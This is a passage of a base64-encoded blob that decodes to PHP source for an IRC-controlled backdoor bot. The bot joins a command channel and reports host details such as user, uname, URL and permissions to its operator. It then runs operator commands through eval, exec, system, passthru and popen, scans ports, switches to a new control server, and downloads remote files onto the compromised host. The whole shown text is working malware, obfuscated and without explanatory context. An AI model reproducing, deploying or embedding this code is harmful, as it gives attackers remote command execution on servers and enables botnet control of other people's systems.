a2V5J10uIiIpOw0KICAgICAgICAgICR0aGlzLT5qb2luKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwkdGhpcy0+Y29uZmlnWydrZXknXSk7DQogICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCJbdXNyOl0gJHVzcm5uIFt1bmFtZTpdICRtbmFtZSIpOw0KCQkgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwiW1NBRkU6XDIgJHNhZmVtb2RlXDJdICR1cmwgW3B3ZDpdICRwdGggKCRyZ2h0cykiKTsNCgkgICB9DQoJICAgaWYoaXNzZXQoJGNtZFsxXSkgJiYgJGNtZFsxXSA9PSIwMDMiKSANCiAgICAgICB7IA0KCSAgIAkgICR0aGlzLT5zZW5kKCJKT0lOICIuJHRoaXMtPmNvbmZpZ1snY2hhbiddLiIgIi4kdGhpcy0+Y29uZmlnWydrZXknXS4iIik7DQogICAgICAgICAgJHRoaXMtPmpvaW4oJHRoaXMtPmNvbmZpZ1snY2hhbiddLCR0aGlzLT5jb25maWdbJ2tleSddKTsNCgkgICB9DQogICAJICAgaWYoaXNzZXQoJGNtZFsxXSkgJiYgJGNtZFsxXSA9PSIwMDQiKSANCiAgICAgICB7IA0KCSAgIAkgICR0aGlzLT5zZW5kKCJKT0lOICIuJHRoaXMtPmNvbmZpZ1snY2hhbiddLiIgIi4kdGhpcy0+Y29uZmlnWydrZXknXS4iIik7DQogICAgICAgICAgJHRoaXMtPmpvaW4oJHRoaXMtPmNvbmZpZ1snY2hhbiddLCR0aGlzLT5jb25maWdbJ2tleSddKTsNCgkgICB9DQoJICAgaWYoaXNzZXQoJGNtZFsxXSkgJiYgJGNtZFsxXSA9PSIwMDUiKSANCiAgICAgICB7IA0KCSAgIAkgICR0aGlzLT5zZW5kKCJKT0lOICIuJHRoaXMtPmNvbmZpZ1snY2hhbiddLiIgIi4kdGhpcy0+Y29uZmlnWydrZXknXS4iIik7DQogICAgICAgICAgJHRoaXMtPmpvaW4oJHRoaXMtPmNvbmZpZ1snY2hhbiddLCR0aGlzLT5jb25maWdbJ2tleSddKTsNCgkgICB9DQogICAgICAgaWYoaXNzZXQoJGNtZFsxXSkgJiYgJGNtZFsxXT09IjQzMyIpIA0KICAgICAgIHsgDQogICAgICAgICAgJHRoaXMtPnNldF9uaWNrKCk7IA0KICAgICAgIH0gDQogICAgICAgaWYoJHRoaXMtPmJ1ZiAhPSAkb2xkX2J1ZikgDQogICAgICAgeyANCiAgICAgICAgICAkbWNtZCA9IGFycmF5KCk7IA0KICAgICAgICAgICRtc2cgPSBzdWJzdHIoc3Ryc3RyKCR0aGlzLT5idWYsIiA6IiksMik7IA0KICAgICAgICAgICRtc2djbWQgPSBleHBsb2RlKCIgIiwkbXNnKTsgDQogICAgICAgICAgJG5pY2sgPSBleHBsb2RlKCIhIiwkY21kWzBdKTsgDQogICAgICAgICAgJHZob3N0ID0gZXhwbG9kZSgiQCIsJG5pY2tbMV0pOyANCiAgICAgICAgICAkdmhvc3QgPSAkdmhvc3RbMV07IA0KICAgICAgICAgICRuaWNrID0gc3Vic3RyKCRuaWNrWzBdLDEpOyANCiAgICAgICAgICAkaG9zdCA9ICRjbWRbMF07IA0KICAgICAgICAgIGlmKCRtc2djbWRbMF09PSR0aGlzLT5uaWNrKSANCiAgICAgICAgICB7IA0KICAgICAgICAgICBmb3IoJGk9MDskaTxjb3VudCgkbXNnY21kKTskaSsrKSANCiAgICAgICAgICAgICAgJG1jbWRbJGldID0gJG1zZ2NtZFskaSsxXTsgDQogICAgICAgICAgfSANCiAgICAgICAgICBlbHNlIA0KICAgICAgICAgIHsgDQogICAgICAgICAgIGZvcigkaT0wOyRpPGNvdW50KCRtc2djbWQpOyRpKyspIA0KICAgICAgICAgICAgICAkbWNtZFskaV0gPSAkbXNnY21kWyRpXTsgDQogICAgICAgICAgfSANCiAgICAgICAgICBpZihjb3VudCgkY21kKT4yKSANCiAgICAgICAgICB7IA0KICAgICAgICAgICAgIHN3aXRjaCgkY21kWzFdKSANCiAgICAgICAgICAgICB7IA0KICAgICAgICAgICAgICAgIGNhc2UgIlFVSVQiOiANCiAgICAgICAgICAgICAgICAgICBpZigkdGhpcy0+aXNfbG9nZ2VkX2luKCRob3N0KSkgDQogICAgICAgICAgICAgICAgICAgeyANCiAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+bG9nX291dCgkaG9zdCk7IA0KICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgYnJlYWs7IA0KICAgICAgICAgICAgICAgIGNhc2UgIlBBUlQiOiANCiAgICAgICAgICAgICAgICAgICBpZigkdGhpcy0+aXNfbG9nZ2VkX2luKCRob3N0KSkgDQogICAgICAgICAgICAgICAgICAgeyANCiAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+bG9nX291dCgkaG9zdCk7IA0KICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgYnJlYWs7IA0KICAgICAgICAgICAgICAgIGNhc2UgIlBSSVZNU0ciOiANCiAgICAgICAgICAgICAgICAgICBpZighJHRoaXMtPmlzX2xvZ2dlZF9pbigkaG9zdCkgJiYgKCR2aG9zdCA9PSAkdGhpcy0+Y29uZmlnWydob3N0YXV0aCddIHx8ICR0aGlzLT5jb25maWdbJ2hvc3RhdXRoJ10gPT0gIioiKSkgDQogICAgICAgICAgICAgICAgICAgeyANCiAgICAgICAgICAgICAgICAgICAgICBpZihzdWJzdHIoJG1jbWRbMF0sMCwxKT09Ii4iKSANCiAgICAgICAgICAgICAgICAgICAgICB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgIHN3aXRjaChzdWJzdHIoJG1jbWRbMF0sMSkpIA0KICAgICAgICAgICAgICAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAidXNlciI6IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJG1jbWRbMV09PSR0aGlzLT5jb25maWdbJ3Bhc3N3b3JkJ10pIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5sb2dfaW4oJGhvc3QpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPm5vdGljZSgkdGhpcy0+Y29uZmlnWydjaGFuJ10sIltcMkF1dGhcMl06IEZvdXRlIHBhc3N3b3JkICRuaWNrIGlkaW9vdCEhIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOyANCiAgICAgICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICBlbHNlaWYoJHRoaXMtPmlzX2xvZ2dlZF9pbigkaG9zdCkpIA0KICAgICAgICAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgICAgICAgaWYoc3Vic3RyKCRtY21kWzBdLDAsMSk9PSIuIikgDQogICAgICAgICAgICAgICAgICAgICAgeyANCiAgICAgICAgICAgICAgICAgICAgICAgICBzd2l0Y2goc3Vic3RyKCRtY21kWzBdLDEpKSANCiAgICAgICAgICAgICAgICAgICAgICAgICB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInJlc3RhcnQiOiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c2VuZCgiUVVJVCA6Z2VyZXN0YXJ0IGRvb3IgJG5pY2siKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmY2xvc2UoJHRoaXMtPmNvbm4pOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c3RhcnQoKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImRucyI6IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKGlzc2V0KCRtY21kWzFdKSkgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaXAgPSBleHBsb2RlKCIuIiwkbWNtZFsxXSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKGNvdW50KCRpcCk9PTQgJiYgaXNfbnVtZXJpYygkaXBbMF0pICYmIGlzX251bWVyaWMoJGlwWzFdKSAmJiBpc19udW1lcmljKCRpcFsyXSkgJiYgaXNfbnVtZXJpYygkaXBbM10pKSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwiW1wyZG5zXDJdOiAiLiRtY21kWzFdLiIgPT4gIi5nZXRob3N0YnlhZGRyKCRtY21kWzFdKSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwiW1wyZG5zXDJdOiAiLiRtY21kWzFdLiIgPT4gIi5nZXRob3N0YnluYW1lKCRtY21kWzFdKSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAiaW5mbyI6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAidnVubCI6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChAaW5pX2dldCgic2FmZV9tb2RlIikgb3Igc3RydG9sb3dlcihAaW5pX2dldCgic2FmZV9tb2RlIikpID09ICJvbiIpIHsgJHNhZmVtb2RlID0gIgM0T04DIjsgfQ0KCQkJCQkJCQkJZWxzZSB7ICRzYWZlbW9kZSA9ICIDOU9GRgMiOyB9DQoJCQkJCQkJCQkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAJCSAgCSR1c3IgPSBnZXRfY3VycmVudF91c2VyKCk7DQoJCQkJCQkJCQkJJHByb2Nlc3NVc2VyID0gcG9zaXhfZ2V0cHd1aWQocG9zaXhfZ2V0ZXVpZCgpKTsNCgkJCQkJCQkJCQlpZiAoJHVzciA9PSAiIikgeyAkdXNyID0gJHByb2Nlc3NVc2VyWyduYW1lJ107IH0NCgkJCQkJCQkJCQkNCgkJCQkJCQkJCQkkdXNybm4gPSAiAzE0Ii4kdXNyLiIDIjsNCgkJICANCgkJCQkJCQkJCQlpZigkdXNyID09ICJyb290IikgeyAkdXNybiA9ICIDMTICIi4kdXNyLiICAyI7IH0NCgkJCQkJCQkJCQlpZigkdXNyID09ICJTWVNURU0iKSB7ICR1c3JuID0gIgMxMgIiLiR1c3IuIgIDIjsgfQkJIA0KCQkNCgkJCQkJCQkJCQkkbW5hbWUgPSAiAzE0Ii5waHBfdW5hbWUoKS4iAyI7DQoJCQkJCQkJCQkJJHVybCA9ICIDMTRodHRwOi8vIi4kX1NFUlZFUlsnU0VSVkVSX05BTUUnXS4iIi4kX1NFUlZFUlsnUkVRVUVTVF9VUkknXS4iAyI7DQoJCQkJCQkJCQkJJHB0aCA9ICIDMTQiLmdldGN3ZCgpLiIDIjsNCgkJICANCgkJCQkJCQkJCQkkcHRoaCA9ICBnZXRjd2QoKS4iIjsNCgkJCQkJCQkJCQljaG1vZCgkcHRoaCwgMDc1NSk7DQoJCQkJCQkJCQkJJHBlcm1zID0gZmlsZXBlcm1zKCIkcHRoaCIpOw0KDQoJCQkJCQkJCQkJaWYgKCgkcGVybXMgJiAweEMwMDApID09IDB4QzAwMCkgeyAkaW5mbyA9ICdzJzsNCgkJCQkJCQkJCQl9IGVsc2VpZiAoKCRwZXJtcyAmIDB4QTAwMCkgPT0gMHhBMDAwKSB7ICRpbmZvID0gJ2wnOw0KCQkJCQkJCQkJCX0gZWxzZWlmICgoJHBlcm1zICYgMHg4MDAwKSA9PSAweDgwMDApIHsgJGluZm8gPSAnLSc7DQoJCQkJCQkJCQkJfSBlbHNlaWYgKCgkcGVybXMgJiAweDYwMDApID09IDB4NjAwMCkgeyAkaW5mbyA9ICdiJzsNCgkJCQkJCQkJCQl9IGVsc2VpZiAoKCRwZXJtcyAmIDB4NDAwMCkgPT0gMHg0MDAwKSB7ICRpbmZvID0gJ2QnOw0KCQkJCQkJCQkJCX0gZWxzZWlmICgoJHBlcm1zICYgMHgyMDAwKSA9PSAweDIwMDApIHsgJGluZm8gPSAnYyc7DQoJCQkJCQkJCQkJfSBlbHNlaWYgKCgkcGVybXMgJiAweDEwMDApID09IDB4MTAwMCkgeyAkaW5mbyA9ICdwJzsNCgkJCQkJCQkJCQl9IGVsc2UgeyAkaW5mbyA9ICd1JzsgfQ0KDQoJCQkJCQkJCQkJLy8gT3duZXINCgkJCQkJCQkJCQkkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDEwMCkgPyAncicgOiAnLScpOw0KCQkJCQkJCQkJCSRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDgwKSA/ICd3JyA6ICctJyk7DQoJCQkJCQkJCQkJJGluZm8gLj0gKCgkcGVybXMgJiAweDAwNDApID8NCgkJCQkJCQkJCQkJCQkoKCRwZXJtcyAmIDB4MDgwMCkgPyAncycgOiAneCcgKSA6DQoJCQkJCQkJCQkJCQkJKCgkcGVybXMgJiAweDA4MDApID8gJ1MnIDogJy0nKSk7DQoNCgkJCQkJCQkJCQkvLyBHcm91cA0KCQkJCQkJCQkJCSRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDIwKSA/ICdyJyA6ICctJyk7DQoJCQkJCQkJCQkJJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMTApID8gJ3cnIDogJy0nKTsNCgkJCQkJCQkJCQkkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAwOCkgPw0KCQkJCQkJCQkJCQkJCSgoJHBlcm1zICYgMHgwNDAwKSA/ICdzJyA6ICd4JyApIDoNCgkJCQkJCQkJCQkJCQkoKCRwZXJtcyAmIDB4MDQwMCkgPyAnUycgOiAnLScpKTsNCg0KCQkJCQkJCQkJCS8vIFdvcmxkDQoJCQkJCQkJCQkJJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDQpID8gJ3InIDogJy0nKTsNCgkJCQkJCQkJCQkkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAwMikgPyAndycgOiAnLScpOw0KCQkJCQkJCQkJCSRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDAxKSA/DQoJCQkJCQkJCQkJCQkJKCgkcGVybXMgJiAweDAyMDApID8gJ3QnIDogJ3gnICkgOg0KCQkJCQkJCQkJCQkJCSgoJHBlcm1zICYgMHgwMjAwKSA/ICdUJyA6ICctJykpOw0KCQkJCQkJCQkJCQkJCQ0KCQkJCQkJCQkJCQkkcmdodHMgPSAiAzE0Ii4kaW5mby4iAyI7CQ0KCQkJDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCJbdXNyOl0gJHVzcm5uIFt1bmFtZTpdICRtbmFtZSIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwiW1NBRkU6XDIgJHNhZmVtb2RlXDJdICR1cmwgW3B3ZDpdICRwdGggKCRyZ2h0cykiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInJuZG5pY2siOiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c2V0X25pY2soKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KCQkJCQkJCQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInJhdyI6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNlbmQoc3Ryc3RyKCRtc2csJG1jbWRbMV0pKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KCQkJCQkJCQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImV2YWwiOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGV2YWwgPSBldmFsKHN1YnN0cihzdHJzdHIoJG1zZywkbWNtZFsxXSksc3RybGVuKCRtY21kWzFdKSkpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KCQkJCQkJCQ0KCQkJICAgICAgICAgICAgICAgIGNhc2UgInNleGVjIjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY29tbWFuZCA9IHN1YnN0cihzdHJzdHIoJG1zZywkbWNtZFswXSksc3RybGVuKCRtY21kWzBdKSsxKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGV4ZWMgPSBzaGVsbF9leGVjKCRjb21tYW5kKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJldCA9IGV4cGxvZGUoIlxuIiwkZXhlYyk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvcigkaT0wOyRpPGNvdW50KCRyZXQpOyRpKyspIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRyZXRbJGldIT1OVUxMKSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sIiAgICAgIDogIi50cmltKCRyZXRbJGldKSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOyANCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImV4ZWMiOiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY29tbWFuZCA9IHN1YnN0cihzdHJzdHIoJG1zZywkbWNtZFswXSksc3RybGVuKCRtY21kWzBdKSsxKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGV4ZWMgPSBleGVjKCRjb21tYW5kKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJldCA9IGV4cGxvZGUoIlxuIiwkZXhlYyk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvcigkaT0wOyRpPGNvdW50KCRyZXQpOyRpKyspIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRyZXRbJGldIT1OVUxMKSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sIiAgICAgIDogIi50cmltKCRyZXRbJGldKSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOyANCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInBhc3N0aHJ1IjogDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNvbW1hbmQgPSBzdWJzdHIoc3Ryc3RyKCRtc2csJG1jbWRbMF0pLHN0cmxlbigkbWNtZFswXSkrMSk7IA0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGV4ZWMgPSBwYXNzdGhydSgkY29tbWFuZCk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXQgPSBleHBsb2RlKCJcbiIsJGV4ZWMpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IoJGk9MDskaTxjb3VudCgkcmV0KTskaSsrKSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkcmV0WyRpXSE9TlVMTCkgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCIgICAgICA6ICIudHJpbSgkcmV0WyRpXSkpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsgDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJwb3BlbiI6IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKGlzc2V0KCRtY21kWzFdKSkgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY29tbWFuZCA9IHN1YnN0cihzdHJzdHIoJG1zZywkbWNtZFswXSksc3RybGVuKCRtY21kWzBdKSsxKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCJbXDJwb3BlblwyXTogJGNvbW1hbmQiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGlwZSA9IHBvcGVuKCRjb21tYW5kLCJyIik7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlKCFmZW9mKCRwaXBlKSkgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGJ1ZiA9IHRyaW0oZmdldHMoJHBpcGUsNTEyKSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRwYnVmICE9IE5VTEwpIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwiICAgICA6ICRwYnVmIik7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGNsb3NlKCRwaXBlKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSAgDQoJCQkgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJzeXN0ZW0iOiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY29tbWFuZCA9IHN1YnN0cihzdHJzdHIoJG1zZywkbWNtZFswXSksc3RybGVuKCRtY21kWzBdKSsxKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGV4ZWMgPSBzeXN0ZW0oJGNvbW1hbmQpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmV0ID0gZXhwbG9kZSgiXG4iLCRleGVjKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yKCRpPTA7JGk8Y291bnQoJHJldCk7JGkrKykgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJHJldFskaV0hPU5VTEwpIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwiICAgICAgOiAiLnRyaW0oJHJldFskaV0pKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJwc2NhbiI6IC8vIC5wc2NhbiAxMjcuMC4wLjEgNjY2NyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZihjb3VudCgkbWNtZCkgPiAyKSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKGZzb2Nrb3BlbigkbWNtZFsxXSwkbWNtZFsyXSwkZSwkcywxNSkpIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwiW1wycHNjYW5cMl06ICIuJG1jbWRbMV0uIjoiLiRtY21kWzJdLiIgaXMgXDJvcGVuXDIiKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sIltcMnBzY2FuXDJdOiAiLiRtY21kWzFdLiI6Ii4kbWNtZFsyXS4iIGlzIFwyY2xvc2VkXDIiKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsgDQoJCQkJCQkJDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAidWQuc2VydmVyIjogLy8gLnVkLnNlcnZlciA8c2VydmVyPiA8cG9ydD4gW3Bhc3N3b3JkXSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZihjb3VudCgkbWNtZCk+MikgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Y29uZmlnWydzZXJ2ZXInXSA9ICRtY21kWzFdOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Y29uZmlnWydwb3J0J10gPSAkbWNtZFsyXTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoaXNzZXQoJG1jbWNkWzNdKSkgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmNvbmZpZ1sncGFzcyddID0gJG1jbWRbM107IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sIltcMnVwZGF0ZVwyXTogU2VydmVyIHZlcmFuZGVyZCAiLiRtY21kWzFdLiI6Ii4kbWNtZFsyXS4iIFdhY2h0d29vcmQ6ICIuJG1jbWRbM10pOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sIltcMnVwZGF0ZVwyXTogU2VydmVyIHZlcmFuZGVyZCAiLiRtY21kWzFdLiI6Ii4kbWNtZFsyXSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsgDQoJCQkJCQkJDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAiZG93bmxvYWQiOiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZihjb3VudCgkbWNtZCkgPiAyKSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCEkZnAgPSBmb3BlbigkbWNtZFsyXSwidyIpKSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7ICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sIltkb3dubG9hZDpdAzE0IEtvbiBiZXN0YW5kIG5pZXQgZG93bmxvYWRlbi4gVG9lc3RlbW1pbmcgZ2V3ZWlnZXJkLiIpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZighJGdldCA9IGZpbGUoJG1jbWRbMV0pKSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwiW2Rvd25sb2FkOl0DMTQgS2FuIGJlc3RhbmQgXDIiLiRtY21kWzFdLiJcMiBuaWV0IGRvd25sb2FkZW4uIik7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yKCRpPTA7JG